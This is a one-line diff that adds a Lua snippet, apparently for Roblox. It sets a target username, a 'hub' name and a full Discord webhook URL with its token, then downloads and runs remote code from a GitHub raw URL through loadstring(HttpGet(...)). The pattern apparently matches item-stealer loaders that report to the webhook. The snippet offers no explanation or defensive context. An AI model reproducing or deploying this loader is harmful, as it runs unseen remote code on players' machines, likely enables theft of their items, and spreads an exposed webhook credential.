@@ -1,0 +1,1 @@
+_G.Username="Boubouzeer";_G.HubName="OP Comet Hope";_G.WebhookUrl="https://discord.com/api/webhooks/1100475154565439588/JukDXvWlt3782zFY4KrmfUIq78snuL6Am7pVDDW2l_5b7NyZsgoXFVDCoDxzuOQ0LFig";loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))();
